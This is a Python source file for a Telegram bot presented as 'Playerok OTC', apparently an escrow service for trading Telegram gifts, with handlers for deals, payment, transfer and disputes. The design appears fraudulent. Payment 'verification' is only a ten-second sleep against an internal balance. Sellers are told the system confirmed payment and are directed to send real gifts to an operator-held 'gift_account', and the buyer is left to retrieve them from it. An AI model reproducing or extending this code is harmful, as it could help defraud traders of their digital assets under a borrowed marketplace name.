import asyncio
from aiogram import Router, Bot, F
from aiogram.types import CallbackQuery, Message
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

from database import Database
from config import TEXTS
from keyboards.inline import (
    deal_type_kb, currency_kb, back_to_deal_kb,
    deal_created_kb, cancel_deal_confirm_kb, back_to_main_kb,
    buyer_deal_kb, seller_confirm_payment_kb, buyer_confirm_receipt_kb,
)
from utils import send_log, validate_gift_links, fmt_username

router = Router()
#pierrot_dev

class DealStates(StatesGroup):
    waiting_links = State()
    waiting_amount = State()


@router.callback_query(F.data == "create_deal")
async def create_deal(callback: CallbackQuery, db: Database, state: FSMContext):
    tg_id = callback.from_user.id
    if await db.is_banned(tg_id):
        lang = await db.get_language(tg_id)
        await callback.answer(TEXTS[lang]["banned"], show_alert=True)
        return
    await state.clear()
    lang = await db.get_language(tg_id)
    try:
        await callback.message.edit_text(
            TEXTS[lang]["choose_deal_type"],
            reply_markup=deal_type_kb(lang),
        )
    except Exception:
        await callback.message.answer(
            TEXTS[lang]["choose_deal_type"],
            reply_markup=deal_type_kb(lang),
        )
    await callback.answer()


@router.callback_query(F.data == "deal_type_gift")
async def deal_type_gift(callback: CallbackQuery, db: Database, state: FSMContext):
    tg_id = callback.from_user.id
    lang = await db.get_language(tg_id)
    await state.set_state(DealStates.waiting_links)
    try:
        await callback.message.edit_text(
            TEXTS[lang]["enter_gift_links"],
            reply_markup=back_to_deal_kb(lang),
        )
    except Exception:
        await callback.message.answer(
            TEXTS[lang]["enter_gift_links"],
            reply_markup=back_to_deal_kb(lang),
        )
    await callback.answer()


@router.message(DealStates.waiting_links)
async def process_links(message: Message, db: Database, state: FSMContext):
    tg_id = message.from_user.id
    lang = await db.get_language(tg_id)
    valid, links = validate_gift_links(message.text or "")
    if not valid:
        await message.answer(
            TEXTS[lang]["invalid_link"],
            reply_markup=back_to_deal_kb(lang),
        )
        return
    await state.update_data(gift_links="\n".join(links))
    await state.set_state(None)
    await message.answer(
        TEXTS[lang]["choose_currency"],
        reply_markup=currency_kb(lang),
    )


@router.callback_query(F.data.startswith("cur_"))
async def choose_currency(callback: CallbackQuery, db: Database, state: FSMContext):
    tg_id = callback.from_user.id
    lang = await db.get_language(tg_id)
    currency = callback.data[4:]
    data = await state.get_data()
    if "gift_links" not in data:
        await callback.answer("Начните создание сделки заново.", show_alert=True)
        return
    await state.update_data(currency=currency)
    await state.set_state(DealStates.waiting_amount)
    try:
        await callback.message.edit_text(
            TEXTS[lang]["enter_amount"].format(currency=currency),
            reply_markup=back_to_deal_kb(lang),
        )
    except Exception:
        await callback.message.answer(
            TEXTS[lang]["enter_amount"].format(currency=currency),
            reply_markup=back_to_deal_kb(lang),
        )
    await callback.answer()


@router.message(DealStates.waiting_amount)
async def process_amount(message: Message, db: Database, state: FSMContext, bot: Bot):
    tg_id = message.from_user.id
    lang = await db.get_language(tg_id)
    try:
        amount = float(message.text.replace(",", "."))
        if amount <= 0:
            raise ValueError
    except (ValueError, AttributeError):
        await message.answer(
            TEXTS[lang]["invalid_amount"],
            reply_markup=back_to_deal_kb(lang),
        )
        return
    data = await state.get_data()
    gift_links = data.get("gift_links", "")
    currency = data.get("currency", "RUB")
    deal_id = await db.create_deal(tg_id, gift_links, currency, amount)
    await state.clear()
    bot_info = await bot.get_me()
    buyer_link = f"https://t.me/{bot_info.username}?start=deal_{deal_id}"
    text = TEXTS[lang]["deal_created"].format(
        amount=amount,
        currency=currency,
        links=gift_links,
        link=buyer_link,
        deal_id=deal_id,
    )
    await message.answer(
        text,
        reply_markup=deal_created_kb(lang, deal_id),
        parse_mode="HTML",
    )
    username = message.from_user.username
    await send_log(
        bot,
        f"🛡 <b>Создана новая сделка</b>\n"
        f"🔑 ID: <code>{deal_id}</code>\n"
        f"👤 Продавец: {fmt_username(username, tg_id)}\n"
        f"🆔 ID: <code>{tg_id}</code>\n"
        f"💰 Сумма: {amount} {currency}\n"
        f"📜 Подарки:\n{gift_links}\n"
        f"🔗 Ссылка: {buyer_link}",
        topic="deals",
        db=db,
    )


@router.callback_query(F.data.startswith("cancel_deal_"))
async def cancel_deal_ask(callback: CallbackQuery, db: Database):
    tg_id = callback.from_user.id
    lang = await db.get_language(tg_id)
    deal_id = callback.data[12:]
    deal = await db.get_deal(deal_id)
    if not deal:
        await callback.answer(TEXTS[lang]["deal_not_found"], show_alert=True)
        return
    if deal["status"] not in ("pending",):
        await callback.answer(TEXTS[lang]["deal_already_done"], show_alert=True)
        return
    if deal["creator_id"] != tg_id:
        await callback.answer("❌ Это не ваша сделка.", show_alert=True)
        return
    try:
        await callback.message.edit_text(
            TEXTS[lang]["cancel_deal_confirm"],
            reply_markup=cancel_deal_confirm_kb(lang, deal_id),
        )
    except Exception:
        await callback.message.answer(
            TEXTS[lang]["cancel_deal_confirm"],
            reply_markup=cancel_deal_confirm_kb(lang, deal_id),
        )
    await callback.answer()


@router.callback_query(F.data.startswith("confirm_cancel_"))
async def confirm_cancel(callback: CallbackQuery, db: Database, bot: Bot):
    tg_id = callback.from_user.id
    lang = await db.get_language(tg_id)
    deal_id = callback.data[15:]
    deal = await db.get_deal(deal_id)
    if not deal or deal["status"] not in ("pending",):
        await callback.answer(TEXTS[lang]["deal_already_done"], show_alert=True)
        return
    if deal["creator_id"] != tg_id:
        await callback.answer("❌ Это не ваша сделка.", show_alert=True)
        return
    await db.cancel_deal(deal_id)
    if deal.get("buyer_id"):
        try:
            await bot.send_message(
                deal["buyer_id"],
                f"❌ Сделка <b>#{deal_id}</b> была отменена продавцом.",
                parse_mode="HTML",
            )
        except Exception:
            pass
    try:
        await callback.message.edit_text(
            TEXTS[lang]["deal_cancelled"],
            reply_markup=back_to_main_kb(lang),
        )
    except Exception:
        await callback.message.answer(TEXTS[lang]["deal_cancelled"])
    await send_log(
        bot,
        f"❌ <b>Сделка отменена</b>\n"
        f"🔑 ID: <code>{deal_id}</code>\n"
        f"👤 Продавец: {fmt_username(callback.from_user.username, tg_id)}\n"
        f"🆔 ID: <code>{tg_id}</code>",
        topic="deals",
        db=db,
    )
    await callback.answer()


@router.callback_query(F.data.startswith("view_deal_"))
async def view_deal(callback: CallbackQuery, db: Database, bot: Bot):
    tg_id = callback.from_user.id
    lang = await db.get_language(tg_id)
    deal_id = callback.data[10:]
    deal = await db.get_deal(deal_id)
    if not deal:
        await callback.answer(TEXTS[lang]["deal_not_found"], show_alert=True)
        return
    bot_info = await bot.get_me()
    buyer_link = f"https://t.me/{bot_info.username}?start=deal_{deal_id}"
    text = TEXTS[lang]["deal_created"].format(
        amount=deal["amount"],
        currency=deal["currency"],
        links=deal["gift_links"],
        link=buyer_link,
        deal_id=deal_id,
    )
    try:
        await callback.message.edit_text(
            text,
            reply_markup=deal_created_kb(lang, deal_id),
            parse_mode="HTML",
        )
    except Exception:
        pass
    await callback.answer()


@router.callback_query(F.data.startswith("buyer_paid_"))
async def buyer_paid(callback: CallbackQuery, db: Database, bot: Bot):
    tg_id = callback.from_user.id
    deal_id = callback.data[11:]
    deal = await db.get_deal(deal_id)
    if not deal:
        await callback.answer("❌ Сделка не найдена.", show_alert=True)
        return
    if deal["status"] != "pending":
        await callback.answer("❌ Статус сделки изменился.", show_alert=True)
        return
    if deal.get("buyer_id") and deal["buyer_id"] != tg_id:
        await callback.answer("❌ Вы не являетесь покупателем в этой сделке.", show_alert=True)
        return

    await callback.answer()

    try:
        await callback.message.edit_text(
            f"🔄 <b>Проверяем оплату по сделке #{deal_id}...</b>\n\n"
            f"💰 Сумма: {deal['amount']} {deal['currency']}\n\n"
            f"⏳ Пожалуйста, ожидайте. Проверка займёт несколько секунд.",
            parse_mode="HTML",
        )
    except Exception:
        pass

    await asyncio.sleep(10)

    deal = await db.get_deal(deal_id)
    if not deal or deal["status"] != "pending":
        try:
            await callback.message.edit_text(
                "❌ <b>Статус сделки изменился.</b> Попробуйте снова.",
                parse_mode="HTML",
            )
        except Exception:
            pass
        return

    balance = await db.get_balance(tg_id, deal["currency"])
    if balance < deal["amount"]:
        try:
            await callback.message.edit_text(
                f"❌ <b>Недостаточно средств.</b>\n\n"
                f"💰 Необходимо: {deal['amount']} {deal['currency']}\n"
                f"💳 Ваш баланс: {round(balance, 2)} {deal['currency']}\n\n"
                f"Пополните баланс и попробуйте снова.",
                parse_mode="HTML",
                reply_markup=buyer_deal_kb(deal_id),
            )
        except Exception:
            pass
        return

    success = await db.deduct_balance(tg_id, deal["amount"], deal["currency"])
    if not success:
        try:
            await callback.message.edit_text(
                f"❌ <b>Ошибка списания средств.</b>\n\n"
                f"Проверьте баланс и попробуйте снова.",
                parse_mode="HTML",
                reply_markup=buyer_deal_kb(deal_id),
            )
        except Exception:
            pass
        return

    await db.set_deal_buyer(deal_id, tg_id, callback.from_user.username or "")
    await db.set_deal_status(deal_id, "paid")
    gift_account = await db.get_setting("gift_account")

    try:
        await callback.message.edit_text(
            f"✅ <b>Оплата по сделке #{deal_id} прошла успешно!</b>\n\n"
            f"💰 Списано: {deal['amount']} {deal['currency']}\n\n"
            f"⏳ Ожидайте — продавец получил уведомление и скоро передаст подарок.\n"
            f"После передачи подарка на аккаунт {gift_account} вы получите уведомление.",
            parse_mode="HTML",
        )
    except Exception:
        pass

    try:
        await bot.send_message(
            deal["creator_id"],
            f"✅ <b>Оплата по сделке #{deal_id} подтверждена системой!</b>\n\n"
            f"👤 Покупатель: @{callback.from_user.username or tg_id} (<code>{tg_id}</code>)\n"
            f"💵 Сумма: {deal['amount']} {deal['currency']}\n"
            f"📜 Подарки:\n{deal['gift_links']}\n\n"
            f"Средства списаны с баланса покупателя.\n"
            f"Переведите подарок на аккаунт {gift_account} и нажмите кнопку ниже.",
            reply_markup=seller_confirm_payment_kb(deal_id),
            parse_mode="HTML",
        )
    except Exception:
        pass

    await send_log(
        bot,
        f"💳 <b>Оплата сделки подтверждена</b>\n"
        f"🔑 ID: <code>{deal_id}</code>\n"
        f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
        f"🛍 Покупатель: @{callback.from_user.username or ''} | ID: <code>{tg_id}</code>",
        topic="deals",
        db=db,
    )


@router.callback_query(F.data.startswith("seller_not_paid_"))
async def seller_not_paid(callback: CallbackQuery, db: Database, bot: Bot):
    tg_id = callback.from_user.id
    deal_id = callback.data[16:]
    deal = await db.get_deal(deal_id)
    if not deal or deal["creator_id"] != tg_id:
        await callback.answer("❌ Нет доступа.", show_alert=True)
        return
    await db.set_deal_status(deal_id, "pending")
    try:
        await callback.message.edit_text(
            f"❌ Вы отклонили оплату по сделке <b>#{deal_id}</b>.\n\n"
            f"Статус сделки возвращён в ожидание.",
            parse_mode="HTML",
        )
    except Exception:
        pass
    if deal.get("buyer_id"):
        try:
            await bot.send_message(
                deal["buyer_id"],
                f"⚠️ Продавец не подтвердил вашу оплату по сделке <b>#{deal_id}</b>.\n\n"
                f"Пожалуйста, проверьте детали перевода или обратитесь в поддержку.",
                parse_mode="HTML",
            )
        except Exception:
            pass
    await send_log(
        bot,
        f"⚠️ <b>Продавец отклонил оплату</b>\n"
        f"🔑 ID: <code>{deal_id}</code>\n"
        f"👤 Продавец: {fmt_username(callback.from_user.username, tg_id)}",
        topic="deals",
        db=db,
    )
    await callback.answer()


@router.callback_query(F.data.startswith("seller_sent_"))
async def seller_sent_gift(callback: CallbackQuery, db: Database, bot: Bot):
    tg_id = callback.from_user.id
    deal_id = callback.data[12:]
    deal = await db.get_deal(deal_id)
    if not deal or deal["creator_id"] != tg_id:
        await callback.answer("❌ Нет доступа.", show_alert=True)
        return
    if deal["status"] != "paid":
        await callback.answer("❌ Статус сделки изменился.", show_alert=True)
        return
    await db.set_deal_status(deal_id, "gift_sent")
    gift_account = await db.get_setting("gift_account")
    try:
        await callback.message.edit_text(
            f"✅ Вы передали подарок по сделке <b>#{deal_id}</b>.\n\n"
            f"⏳ Ожидаем подтверждения от покупателя.",
            parse_mode="HTML",
        )
    except Exception:
        pass
    if deal.get("buyer_id"):
        try:
            await bot.send_message(
                deal["buyer_id"],
                f"🎁 <b>Продавец передал подарок на аккаунт {gift_account}!</b>\n\n"
                f"📜 Подарки:\n{deal['gift_links']}\n\n"
                f"Пожалуйста, переведите подарок с аккаунта {gift_account} к себе.\n"
                f"После получения нажмите кнопку подтверждения.",
                reply_markup=buyer_confirm_receipt_kb(deal_id),
                parse_mode="HTML",
            )
        except Exception:
            pass
    await send_log(
        bot,
        f"🎁 <b>Продавец передал подарок</b>\n"
        f"🔑 ID: <code>{deal_id}</code>\n"
        f"👤 Продавец: {fmt_username(callback.from_user.username, tg_id)}\n"
        f"📜 Подарки: {deal['gift_links']}",
        topic="deals",
        db=db,
    )
    await callback.answer("✅ Покупатель уведомлён!")


@router.callback_query(F.data.startswith("buyer_got_"))
async def buyer_got_gift(callback: CallbackQuery, db: Database, bot: Bot):
    tg_id = callback.from_user.id
    deal_id = callback.data[10:]
    deal = await db.get_deal(deal_id)
    if not deal:
        await callback.answer("❌ Сделка не найдена.", show_alert=True)
        return
    if deal["status"] != "gift_sent":
        await callback.answer("❌ Статус сделки изменился.", show_alert=True)
        return
    buyer_username = callback.from_user.username or ""
    await db.complete_deal(deal_id, tg_id, buyer_username)
    creator = await db.get_user(deal["creator_id"])
    creator_name = fmt_username(creator["username"] if creator else None, deal["creator_id"])
    try:
        await callback.message.edit_text(
            f"✅ <b>Сделка #{deal_id} успешно завершена!</b>\n\n"
            f"Спасибо за использование Playerok OTC!\n"
            f"💰 Сумма: {deal['amount']} {deal['currency']}",
            parse_mode="HTML",
        )
    except Exception:
        pass
    try:
        await bot.send_message(
            deal["creator_id"],
            f"✅ <b>Сделка #{deal_id} успешно завершена!</b>\n\n"
            f"🛍 Покупатель подтвердил получение подарка.\n"
            f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
            f"👤 Покупатель: @{buyer_username}",
            parse_mode="HTML",
        )
    except Exception:
        pass
    await send_log(
        bot,
        f"✅ <b>Сделка завершена покупателем</b>\n"
        f"🔑 ID: <code>{deal_id}</code>\n"
        f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
        f"📜 Подарки: {deal['gift_links']}\n"
        f"👤 Продавец: {creator_name}\n"
        f"🛍 Покупатель: @{buyer_username} | ID: <code>{tg_id}</code>",
        topic="deals",
        db=db,
    )
    await callback.answer("🎉 Сделка завершена!")


@router.callback_query(F.data.startswith("buyer_dispute_"))
async def buyer_dispute(callback: CallbackQuery, db: Database, bot: Bot):
    tg_id = callback.from_user.id
    deal_id = callback.data[14:]
    deal = await db.get_deal(deal_id)
    if not deal:
        await callback.answer("❌ Сделка не найдена.", show_alert=True)
        return
    support = await db.get_setting("support_username")
    await db.set_deal_status(deal_id, "disputed")
    try:
        await callback.message.edit_text(
            f"⚠️ <b>Спор открыт по сделке #{deal_id}</b>\n\n"
            f"Обратитесь в поддержку: {support}\n"
            f"Укажите ID сделки: <code>{deal_id}</code>",
            parse_mode="HTML",
        )
    except Exception:
        pass
    try:
        await bot.send_message(
            deal["creator_id"],
            f"⚠️ <b>Покупатель открыл спор по сделке #{deal_id}!</b>\n\n"
            f"Покупатель заявляет, что не получил подарок.\n"
            f"Обратитесь в поддержку: {support}",
            parse_mode="HTML",
        )
    except Exception:
        pass
    await send_log(
        bot,
        f"⚠️ <b>Открыт спор по сделке</b>\n"
        f"🔑 ID: <code>{deal_id}</code>\n"
        f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
        f"🛍 Покупатель: @{callback.from_user.username or ''} | ID: <code>{tg_id}</code>",
        topic="deals",
        db=db,
    )
    await callback.answer()
